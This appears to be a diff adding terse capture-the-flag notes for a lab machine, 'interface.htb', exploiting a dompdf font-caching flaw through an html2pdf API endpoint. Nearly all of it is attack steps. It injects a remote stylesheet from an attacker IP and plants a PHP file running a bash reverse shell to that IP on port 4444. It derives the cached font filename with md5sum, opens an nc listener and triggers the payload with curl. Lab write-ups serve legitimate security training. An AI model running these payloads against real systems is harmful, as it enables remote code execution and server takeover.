@@ -1,0 +1,25 @@
+Open burpsuite and access /api/html2pdf
+
+Change request method to POST
+
+Add in missing parameters and change Content-Type: application/json
+
+{"html":"<link rel=stylesheet href='http://10.10.14.4/exploit.css'>", "paper": "A4"}
+
+edit exploit.css to include http://10.10.14.4/exploit_font.php
+
+edit exploit_font.php at the bottom script 
+
+<?php exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.14.4/4444 0>&1'"); ?>
+
+Send request
+
+echo -n 'http://10.10.14.4/exploit_font.php' | md5sum
+
+nc -nlvp 4444
+
+curl -i http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_2d9cfd7f66e8bdf74a136a88c4e9fe3a.php
+
+
+
+
